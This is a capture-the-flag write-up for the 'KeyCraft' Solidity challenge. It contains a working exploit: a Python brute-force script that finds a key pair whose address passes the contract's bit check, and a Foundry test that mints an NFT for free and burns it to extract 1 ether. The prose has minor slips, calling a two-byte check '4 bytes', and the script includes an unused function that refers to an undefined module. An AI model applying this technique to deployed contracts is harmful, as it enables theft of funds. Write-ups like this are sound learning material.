# KeyCraft

## Challenge

We are provided a contract:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract KeyCraft is ERC721 {
    uint totalSupply;
    address owner;
    bool buyNFT;

    constructor(string memory _name, string memory _symbol)
        ERC721(_name, _symbol)
    {
        _mint(msg.sender, totalSupply++);
        owner = msg.sender;
    }

    modifier checkAddress(bytes memory b) {
        bool q;
        bool w;

        if (msg.sender == owner) {
            buyNFT = true;
        } else {
            uint a = uint160(uint256(keccak256(b)));
            q = (address(uint160(a)) == msg.sender);

            a = a >> 108;
            a = a << 240;
            a = a >> 240;

            w = (a == 13057);
        }

        buyNFT = (q && w) || buyNFT;
        _;
        buyNFT = false;
    }

    function mint(bytes memory b) public payable checkAddress(b) {
        require(msg.value >= 1 ether || buyNFT, "Not allowed to mint.");
        _mint(msg.sender, totalSupply++);
    }

    function burn(uint tok) public {
        address a = ownerOf(tok);
        require(msg.sender == a);
        _burn(tok);
        totalSupply--;
        payable(a).transfer(1 ether);
    }
}
```

and a POC setup:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/KeyCraft.sol";

contract KC is Test {
    KeyCraft k;
    address owner;
    address user;
    address attacker;

    function setUp() public {
        owner = makeAddr("owner");
        user = makeAddr("user");
        attacker = <Your Address>

        vm.deal(user, 1 ether);

        vm.startPrank(owner);
        k = new KeyCraft("KeyCraft", "KC");
        vm.stopPrank();

        vm.startPrank(user);
        k.mint{value: 1 ether}(hex"dead");
        vm.stopPrank();
    }

    function testKeyCraft() public {
        vm.startPrank(attacker);

        //Solution

        vm.stopPrank();
        assertEq(attacker.balance, 1 ether);
    }
}
```

Challenge Description:
You are provided with 0 ether. After the hack, you should have 1 ether.

## Solution

The challenge is focused on understanding how public/private-key pairs and addresses are generated on the Ethereum chain. The goal is to get 1 ether. This can be achieved by calling the mint() function without paying anything. This can be achieved by either being the owner or passing the checks in the checkAddress modifier. The checkAddress modifier effectively checks for 2 things:

### 1. Public key -> Address

It first checks if the value b hashed using keccak256 and only using the last 20 bytes is equal to msg.sender. This essentially is what happens when an address is generated from a public key. So we have to pass the public key as b, to pass this check.

### 2. Check for 4bytes of Address

The function then does some weird bit shifts, which essentially leads to checking if a certain 4 bytes are 0x3301. The bytes are marked with an X below. 

```txt
000000000XXXX000000000000000000000000000

```

So to pass this check we need to generate public/private key pairs and calculate their addresses until we find a pair that has these bytes set in its address. I wrote a Python script that does that for me:

```python
from secrets import token_bytes
from coincurve import PublicKey
from sha3 import keccak_256

def generate_public_key(private_key):
    public_key = keys.PrivateKey(bytes(private_key, 32)).public_key
    return public_key

def check_addr(address):
    address = int.from_bytes(address, 'big') & 0xFFFF000000000000000000000000000
    address = address >> 108
    return address == 13057

found_key = False

for i in range(pow(2, 16)):
    private_key = keccak_256(token_bytes(32)).digest()

    public_key = PublicKey.from_valid_secret(private_key).format(compressed=False)[1:]
    addr = keccak_256(public_key).digest()[-20:]

    print("Private Key:", private_key.hex())
    print("Public Key:", public_key.hex())
    print("Address:", addr.hex())

    if check_addr(addr):
        found_key = True
        print("Key found")
        break
```

Then I just used the pair to fulfill the test case. For passing the public key I needed abi.encodepacked and split the public key into 2 uint256s as there is no uint512 in solidity, but the key is 64 bytes long.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/KeyCraft.sol";

contract KC is Test {
    KeyCraft k;
    address owner;
    address user;
    address attacker;

    function setUp() public {
        owner = makeAddr("owner");
        user = makeAddr("user");
        attacker = vm.addr(0x5e5a515c460a667ce45f9e0949c5c2357250556909304b7c2ee8202a4b2909ac);

        vm.deal(user, 1 ether);

        vm.startPrank(owner);
        k = new KeyCraft("KeyCraft", "KC");
        vm.stopPrank();

        vm.startPrank(user);
        k.mint{value: 1 ether}(hex"dead");
        vm.stopPrank();
    }

    function testKeyCraft() public {
        vm.startPrank(attacker);

        k.mint(abi.encodePacked(uint256(0xf89ae7139a2ecac685ff9161992b9ed1be7ae447883a9b42d533b0f67028298f), uint256(0x2cad20f5d06c1a65b3542e5287da1e2cd7c0fe17aeddd21edf58370c6eb1e07d)));

        k.burn(2);

        vm.stopPrank();
        assertEq(attacker.balance, 1 ether);
    }
}
```
